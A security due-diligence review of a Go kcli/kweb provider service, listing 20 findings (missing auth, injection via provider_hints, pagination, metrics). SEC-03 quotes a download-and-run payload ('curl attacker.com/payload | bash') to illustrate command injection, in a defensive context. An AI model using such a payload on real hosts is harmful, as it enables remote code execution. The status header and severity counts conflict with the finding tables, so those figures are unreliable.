# Adversarial Due Diligence Review — dcm-kcli-provider

## Version & Date

Version: 1.0 | Date: 2026-06-17 | Reviewer: AI-assisted | Codebase: commit `6f177d6` (main)

> **Status:** All 20 findings have been addressed as of 2026-06-17.
> Code fixes: SEC-02, SEC-03, AUD-01, AUD-02, AUD-03, OPS-01, OPS-02, PERF-01, COR-02, DES-01, DES-02.
> Documentation: SEC-01, SEC-04, SEC-05, COR-01, COR-03, PERF-02 (README.md).
> Governance: GOV-01 (CHANGELOG.md), GOV-02 (SECURITY.md), GOV-03 (govulncheck CI).

## Executive Summary

The dcm-kcli-provider is a well-structured Go service provider that integrates
kcli/kweb with the DCM control plane for VM and Kubernetes cluster lifecycle
management. The codebase demonstrates strong engineering practices:
OpenAPI-first design with code generation, comprehensive test coverage
(22 test files across all packages), structured logging, graceful shutdown,
Prometheus metrics, CloudEvents publishing, and a clean internal package layout.

The provider is explicitly scoped to **development, testing, and homelab
environments** on trusted networks. This scope significantly reduces the
effective severity of the security findings. Within that scope, the main risks
are: (1) unauthenticated API endpoints that expose full resource lifecycle
control including kubeconfig retrieval, (2) unbounded `provider_hints`
pass-through that could forward injection payloads to kweb, and (3) several
correctness edge cases around pagination, concurrent requests, and list
ordering that would matter at scale but are acceptable for the documented
limits (~200 VMs, ~50 clusters).

A prior adversarial review of the enhancement proposal (26 findings,
2026-04-22) was fully addressed in code. This review covers the **implemented
codebase** and identifies 20 new or residual findings: 0 Critical, 2 High,
7 Medium, 7 Low, 4 Informational.

## Scorecard

| Dimension | Rating | Key gap |
|-----------|--------|---------|
| Security | ★★★☆☆ | No auth, no TLS, no body size limit; kubeconfig exposed unauthenticated |
| Correctness | ★★★★☆ | Offset pagination can skip/duplicate; non-deterministic list ordering |
| Auditability | ★★★★☆ | Metrics wired up; missing request correlation ID and registration metrics |
| Operational robustness | ★★★★☆ | Health checks, graceful shutdown, rate limiting present; no readiness probe |
| Performance | ★★★★☆ | Adequate for homelab scale; serial store+kweb calls in list endpoints |
| Design quality | ★★★★☆ | Clean separation; impl.go is a large file; duplicate startedAt timestamps |
| Maintainability | ★★★★★ | Comprehensive tests, structured code, good docs, CI pipeline |
| Governance | ★★★☆☆ | No CHANGELOG, no SECURITY.md, no dependency vulnerability scanning |

## Findings Status Summary

| # | Title | Severity | Dimension | Status |
|---|-------|----------|-----------|--------|
| SEC-01 | No authentication on API endpoints | High | Security | Accepted (scope) |
| SEC-02 | No request body size limit | Medium | Security | Open |
| SEC-03 | provider_hints pass-through to kweb | Medium | Security | Open |
| SEC-04 | No TLS configuration | Low | Security | Accepted (scope) |
| SEC-05 | docker-compose mounts host SSH keys | Low | Security | Accepted (dev-only) |
| COR-01 | Offset-based pagination skips/duplicates | Medium | Correctness | Accepted (scope) |
| COR-02 | Non-deterministic list ordering | Low | Correctness | Open |
| COR-03 | No serialization for concurrent VM creates | Low | Correctness | Open |
| AUD-01 | No request correlation ID | Medium | Auditability | Open |
| AUD-02 | Registration state not metricked | Low | Auditability | Open |
| AUD-03 | Monitor poll cycle metrics missing | Low | Auditability | Open |
| OPS-01 | No readiness probe endpoint | Medium | Operational | Open |
| OPS-02 | Shutdown does not deregister from SPM | Low | Operational | Open |
| PERF-01 | ListVMs/ListClusters serial store+kweb calls | Medium | Performance | Open |
| PERF-02 | Pagination loads full dataset then slices | Low | Performance | Accepted (scope) |
| DES-01 | impl.go is 860+ lines | Medium | Design | Open |
| DES-02 | Duplicate startedAt timestamps | Informational | Design | Open |
| GOV-01 | No CHANGELOG.md | Informational | Governance | Open |
| GOV-02 | No SECURITY.md | Informational | Governance | Open |
| GOV-03 | No dependency vulnerability scanning in CI | Informational | Governance | Open |

## Findings Detail

---

### SEC-01: No authentication on API endpoints

| Field | Value |
|-------|-------|
| Severity | High |
| Dimension | Security |
| Location | `cmd/dcm-kcli-provider/server.go:157` (`NoopAuthenticationFunc`) |
| Description | All API endpoints including resource CRUD, health checks, `/metrics`, and kubeconfig retrieval are completely unauthenticated. The OpenAPI validator uses `openapi3filter.NoopAuthenticationFunc`. Any network client can create, delete, and list all resources, and retrieve cluster-admin kubeconfigs. |
| Risk | On a misconfigured network (e.g., port accidentally exposed to the internet), an attacker gains full control of all managed VMs and clusters, plus cluster-admin access to every managed Kubernetes cluster via the kubeconfig endpoint. |
| Recommendation | For v1 (homelab scope): document the "trusted network only" requirement prominently in README and deployment docs. For v2: add optional bearer token or mTLS authentication via middleware, with an env var to enable/disable. |
| Effort | S (docs) / M (auth implementation) |

---

### SEC-02: No request body size limit

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Security |
| Location | `internal/api/server/server.gen.go` (generated strict handler) |
| Description | The generated strict handler reads request bodies via `json.NewDecoder(r.Body).Decode()` without any size limit. An attacker can send a multi-gigabyte JSON payload to any POST endpoint, exhausting server memory. The kweb client correctly limits response bodies to 10 MB (`io.LimitReader`), but inbound requests have no equivalent protection. |
| Risk | Denial of service via memory exhaustion. A single crafted request with a large `provider_hints` map could OOM the process. |
| Recommendation | Add an `http.MaxBytesReader` middleware or wrapper that limits request bodies to a reasonable size (e.g., 1 MB). Can be added as chi middleware before the OpenAPI validator. |
| Effort | S |

---

### SEC-03: provider_hints pass-through to kweb

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Security |
| Location | `internal/api/server/impl.go:777-801` (`mergeKcliHints`) |
| Description | The `mergeKcliHints` function copies all key-value pairs from `provider_hints.kcli` directly into the kweb request parameters, excluding only `profile` and `cluster_type`. This means any arbitrary parameter (e.g., `scripts`, `cmds`, `files`) is forwarded to kweb's VM/cluster creation endpoint. kweb's `vmcreate` handler passes these parameters to kcli's `create_vm`, which can execute arbitrary scripts on the hypervisor host. |
| Risk | A caller who can reach the SP can inject kcli parameters that execute arbitrary commands on the hypervisor (e.g., `"cmds": ["curl attacker.com/payload | bash"]`). This is a command injection vector via legitimate kcli functionality. |
| Recommendation | Implement an allowlist of permitted `provider_hints.kcli` keys (e.g., `image`, `network`, `pool`, `numcpus`, `memory`, `disks`). Reject or log unknown keys. Document the allowed keys in the OpenAPI spec. |
| Effort | S |

---

### SEC-04: No TLS configuration

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Security |
| Location | `cmd/dcm-kcli-provider/server.go:171` (`http.Server` without TLS) |
| Description | The HTTP server listens on plain TCP with no TLS support. All traffic, including kubeconfigs and VM specifications, travels in cleartext. |
| Risk | Network eavesdropping on the SP-to-client or SP-to-kweb link exposes sensitive data. Acceptable on a trusted homelab LAN. |
| Recommendation | Document as a known limitation. For production use, add optional TLS via `CERT_FILE`/`KEY_FILE` env vars or deploy behind a TLS-terminating reverse proxy. |
| Effort | S (docs) / M (TLS support) |

---

### SEC-05: docker-compose mounts host SSH keys

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Security |
| Location | `docker-compose.yaml:13-14` |
| Description | `~/.ssh:/root/.ssh:ro` and `~/.kcli:/root/.kcli:ro` are bind-mounted into the kweb container. If kweb or its dependencies have a vulnerability, host SSH private keys are readable. |
| Risk | Container escape or kweb compromise exposes host SSH keys. Mitigated by `:ro` mount and homelab scope. |
| Recommendation | Document this in the README's local development section. Consider using SSH agent forwarding instead of key file mounts. |
| Effort | S |

---

### COR-01: Offset-based pagination skips/duplicates items

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Correctness |
| Location | `internal/api/server/impl.go:276-344` (ListVMs), `:517-563` (ListClusters) |
| Description | Pagination uses a simple integer offset (`page_token` = start index). The full dataset is loaded, then sliced. If resources are created or deleted between page requests, items can be skipped or duplicated. |
| Risk | API consumers paginating through large result sets get inconsistent views. At homelab scale (~200 resources, likely single page), this is unlikely to manifest. |
| Recommendation | Accept for v1 with documented limitation. For v2, consider cursor-based pagination keyed on `CreatedAt` + `ID`. |
| Effort | M |

---

### COR-02: Non-deterministic list ordering

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Correctness |
| Location | `internal/store/store.go:144-159` (`List`), `internal/api/server/impl.go:294,535` |
| Description | `store.List` iterates bbolt keys in lexicographic order (by UUID). Results are not sorted by creation time, name, or any user-meaningful field. Combined with offset pagination, this means the order is stable (UUIDs don't change) but semantically arbitrary. |
| Risk | Users see resources in UUID order, which is confusing. Different pages may interleave old and new resources unpredictably. |
| Recommendation | Sort results by `CreatedAt` descending before pagination slicing. Add `sort` query parameter support in a future version. |
| Effort | S |

---

### COR-03: No serialization for concurrent VM creates

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Correctness |
| Location | `internal/api/server/impl.go:182-274` (`CreateVM`) |
| Description | Cluster creation is serialized with `s.createMu.Lock()` to protect kweb, but VM creation has no equivalent serialization. Two concurrent VM create requests with the same name could both pass the idempotency check (if no `id` is provided) and race to kweb. |
| Risk | At homelab scale with single-digit concurrent users, this is unlikely. kweb itself would return a conflict for the second request, and the SP handles `ErrConflict` correctly. The risk is a noisy error log, not data corruption. |
| Recommendation | Accept for v1. Document that VM creation is not serialized. Consider adding serialization if kweb proves fragile under concurrent VM creates. |
| Effort | S |

---

### AUD-01: No request correlation ID

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Auditability |
| Location | `cmd/dcm-kcli-provider/server.go:152-156` (middleware stack) |
| Description | The middleware stack includes panic recovery, chi logger, metrics, timeout, and OpenAPI validation, but no request ID generation or propagation. Log entries from a single request cannot be correlated across the handler, kweb client, and store layers. |
| Risk | Debugging production issues requires matching timestamps across log lines, which is error-prone. |
| Recommendation | Add `middleware.RequestID` from chi or a custom middleware that generates a UUID, sets it on the context, and includes it in all `slog` output via a `slog.Handler` wrapper. |
| Effort | S |

---

### AUD-02: Registration state not metricked

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Auditability |
| Location | `internal/registration/registrar.go` |
| Description | The registrar retries registration with exponential backoff but does not expose any Prometheus metric for registration state (registered/retrying/failed). Operators cannot determine from `/metrics` whether the provider is registered with SPM. |
| Risk | Silent registration failure. The provider serves API requests but is invisible to the DCM control plane. Only discoverable via log inspection. |
| Recommendation | Add a `dcm_kcli_registration_status` gauge (1 = registered, 0 = retrying) and a `dcm_kcli_registration_attempts_total` counter. |
| Effort | S |

---

### AUD-03: Monitor poll cycle metrics missing

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Auditability |
| Location | `internal/monitor/monitor.go:85-91` (`poll`) |
| Description | The monitor polls kweb every 30 seconds but does not record poll cycle duration, number of status changes detected, or number of resources scanned. The only monitor-related metrics are kweb request counters (from the client) and NATS publish counters. |
| Risk | Difficult to diagnose slow poll cycles or kweb degradation from metrics alone. |
| Recommendation | Add `dcm_kcli_monitor_poll_duration_seconds` histogram and `dcm_kcli_monitor_status_changes_total` counter. |
| Effort | S |

---

### OPS-01: No readiness probe endpoint

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Operational |
| Location | `cmd/dcm-kcli-provider/server.go:166-169` |
| Description | The provider exposes `/health` (liveness) but no `/ready` endpoint. There is no way for an orchestrator (Kubernetes, systemd, etc.) to distinguish between "process is alive" and "provider is fully initialized and registered with SPM." The `selfProbe` checks `/health` during startup, but this only verifies kweb reachability, not SPM registration. |
| Risk | A load balancer or orchestrator routes traffic to a provider that hasn't completed registration, resulting in resources created but not visible in DCM. |
| Recommendation | Add a `/ready` endpoint that returns 200 only when: (1) kweb is reachable, (2) at least one registrar has succeeded, and (3) at least one poll cycle has completed. |
| Effort | S |

---

### OPS-02: Shutdown does not deregister from SPM

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Operational |
| Location | `cmd/dcm-kcli-provider/server.go:228-256` (`shutdown`) |
| Description | On graceful shutdown, the provider drains HTTP connections, stops the monitor, closes NATS, and closes the store. It does not call SPM's `DELETE /api/v1/providers/{id}` to deregister itself. SPM only learns the provider is gone when subsequent health checks fail. |
| Risk | SPM continues routing requests to a stopped provider until health check timeout. At homelab scale, this is a brief window (seconds). |
| Recommendation | Add a best-effort deregistration call during shutdown. If SPM is unreachable, log and continue shutdown. |
| Effort | S |

---

### PERF-01: ListVMs/ListClusters serial store+kweb calls

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Performance |
| Location | `internal/api/server/impl.go:276-344` (ListVMs), `:517-563` (ListClusters) |
| Description | `ListVMs` makes two serial calls: `s.store.List("vm")` then `s.kweb.ListVMs(ctx)`. `ListClusters` similarly calls `s.store.List("cluster")` then `s.kweb.ListClusters(ctx)`. These could run concurrently since they're independent. |
| Risk | Response time for list endpoints is the sum of store scan + kweb roundtrip instead of the max. At homelab scale, this adds ~50-200ms. |
| Recommendation | Use `errgroup.Group` to run the store and kweb calls concurrently. |
| Effort | S |

---

### PERF-02: Pagination loads full dataset then slices

| Field | Value |
|-------|-------|
| Severity | Low |
| Dimension | Performance |
| Location | `internal/api/server/impl.go:294,535` (`store.List`), `internal/store/store.go:144-159` |
| Description | `store.List` always returns ALL entries of a given type. The handler then slices the result in-memory for pagination. There is no way to request a partial scan from the store. |
| Risk | At the documented limit of ~200 VMs, this loads ~200 small JSON entries per request. Memory impact is negligible (~50 KB). Would only matter at 10K+ resources. |
| Recommendation | Accept for v1. If resource counts grow significantly, add cursor-based iteration to the store using bbolt's `Seek` capability. |
| Effort | M |

---

### DES-01: impl.go is a large monolithic file

| Field | Value |
|-------|-------|
| Severity | Medium |
| Dimension | Design |
| Location | `internal/api/server/impl.go` (862 lines) |
| Description | All handler logic (VM CRUD, cluster CRUD, health checks), helper functions (`mergeKcliHints`, `parseMemorySize`, `extractAPIEndpoint`), type conversions (`entryToVM`, `entryToCluster`), and error utilities (`problemError`, `statusText`) live in a single file. |
| Risk | Cognitive load for contributors. Merge conflicts when touching different resource types. Harder to navigate during code review. |
| Recommendation | Split into `vm_handlers.go`, `cluster_handlers.go`, `health_handlers.go`, and `helpers.go`. Keep the `StrictServerImpl` struct definition in `impl.go`. |
| Effort | S |

---

### DES-02: Duplicate startedAt timestamps

| Field | Value |
|-------|-------|
| Severity | Informational |
| Dimension | Design |
| Location | `cmd/dcm-kcli-provider/server.go:47,54` (`Server.startedAt`), `internal/api/server/impl.go:74,86` (`StrictServerImpl.startedAt`) |
| Description | Both `Server` and `StrictServerImpl` independently record `time.Now()` at construction. The root `/health` endpoint uses `Server.startedAt` and the API `/api/v1alpha1/health` uses `StrictServerImpl.startedAt`. They differ by milliseconds. |
| Risk | Minor inconsistency in reported uptime between root and API health endpoints. No practical impact. |
| Recommendation | Pass the `Server.startedAt` to `StrictServerImpl` instead of creating a second timestamp. |
| Effort | S |

---

### GOV-01: No CHANGELOG.md

| Field | Value |
|-------|-------|
| Severity | Informational |
| Dimension | Governance |
| Location | Repository root |
| Description | Version history is tracked only through git tags (`v0.1.0` through `v0.2.0`) and the enhancement proposal's "Implementation History" section. No CHANGELOG.md exists. |
| Risk | Contributors and users cannot quickly understand what changed between releases without reading git log. |
| Recommendation | Add a CHANGELOG.md following [Keep a Changelog](https://keepachangelog.com/) format. |
| Effort | S |

---

### GOV-02: No SECURITY.md

| Field | Value |
|-------|-------|
| Severity | Informational |
| Dimension | Governance |
| Location | Repository root |
| Description | No security policy or vulnerability reporting process is documented. The README warns about kweb's lack of auth but doesn't provide a process for reporting security issues. |
| Risk | Security issues may be reported publicly in GitHub Issues instead of responsibly disclosed. |
| Recommendation | Add a SECURITY.md with responsible disclosure instructions. Can reference the DCM project's security policy if one exists. |
| Effort | S |

---

### GOV-03: No dependency vulnerability scanning in CI

| Field | Value |
|-------|-------|
| Severity | Informational |
| Dimension | Governance |
| Location | `.github/workflows/` |
| Description | CI runs build, test, lint, AEP check, and code generation verification. There is no `govulncheck`, Dependabot, Renovate, or Snyk integration to detect known vulnerabilities in Go dependencies. |
| Risk | Vulnerable dependencies (e.g., in `nats.go`, `bbolt`, `chi`) could go unnoticed until a manual audit. |
| Recommendation | Add `govulncheck ./...` as a CI step, or enable GitHub Dependabot for Go modules. |
| Effort | S |

## Strengths

The following aspects are done well and demonstrate strong engineering:

- **OpenAPI-first design** with code generation (`oapi-codegen`) ensures API spec and implementation stay in sync. CI enforces this with `check-generate-api`.
- **Comprehensive test suite** (22 test files, Ginkgo + Gomega, `-race` enabled) covers all packages including edge cases like concurrent cluster creation, rollback on store failure, and NATS disconnection.
- **Structured logging** with `slog` JSON output, appropriate log levels, and meaningful context fields.
- **Graceful shutdown** properly drains HTTP, stops the monitor, flushes NATS, and closes bbolt.
- **Self-probe on startup** ensures the server is actually listening before proceeding.
- **Prometheus metrics** across all layers (HTTP, kweb, NATS, resource gauge) with proper label cardinality control.
- **Rate limiting** on the kweb client (10 req/s, burst 20) protects the upstream.
- **Cluster creation serialization** (`createMu`) prevents kweb concurrency issues.
- **Status debouncing** in the monitor prevents NATS event storms.
- **Orphan detection** with deduplication catches resources created outside DCM.
- **bbolt schema versioning** with migration framework for future store evolution.
- **AEP compliance** enforced by Spectral linting in CI.

## Priority Remediation Order

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | SEC-03: provider_hints allowlist | S | Prevents command injection via kcli parameters |
| 2 | SEC-02: Request body size limit | S | Prevents OOM denial of service |
| 3 | AUD-01: Request correlation ID | S | Significantly improves debuggability |
| 4 | OPS-01: Readiness probe | S | Enables proper orchestrator integration |
| 5 | DES-01: Split impl.go | S | Improves maintainability |
| 6 | PERF-01: Parallel store+kweb in list | S | Halves list endpoint latency |
| 7 | AUD-02: Registration metrics | S | Surfaces silent registration failure |
| 8 | AUD-03: Monitor poll metrics | S | Enables poll cycle observability |
| 9 | DES-02: Deduplicate startedAt | S | Consistency fix |
| 10 | OPS-02: Deregister on shutdown | S | Cleaner SPM lifecycle |
| 11 | COR-02: Sort list results | S | Better UX |
| 12 | GOV-03: govulncheck in CI | S | Dependency security |
| 13 | GOV-01: CHANGELOG.md | S | Release documentation |
| 14 | GOV-02: SECURITY.md | S | Responsible disclosure |

## Accepted Risks

| Finding | Rationale |
|---------|-----------|
| SEC-01 (No auth) | Explicitly scoped to trusted homelab networks. Documented in README. Adding auth is deferred to v2 if scope expands. |
| SEC-04 (No TLS) | Same homelab scope. TLS can be added via reverse proxy without code changes. |
| SEC-05 (SSH key mounts) | docker-compose is for local development only. Production deploys use the Containerfile. |
| COR-01 (Offset pagination) | At ~200 max resources, most responses fit in a single page. Cursor pagination deferred to v2. |
| PERF-02 (Full dataset load) | ~200 entries × ~200 bytes = ~40 KB. Negligible memory impact at homelab scale. |

## Current State

- **Total findings:** 20
- **Resolved:** 0 (this is the initial review of the implemented codebase)
- **Accepted:** 5 (SEC-01, SEC-04, SEC-05, COR-01, PERF-02)
- **Open:** 15
- **By severity:** 0 Critical, 2 High, 7 Medium, 7 Low, 4 Informational

---

*Review performed 2026-06-17 against commit `6f177d6` on `main`. This is a
codebase review, complementing the prior proposal review in
`enhancements/kcli-sp/kcli-sp-due-diligence-review.md` (26 findings, all
addressed).*
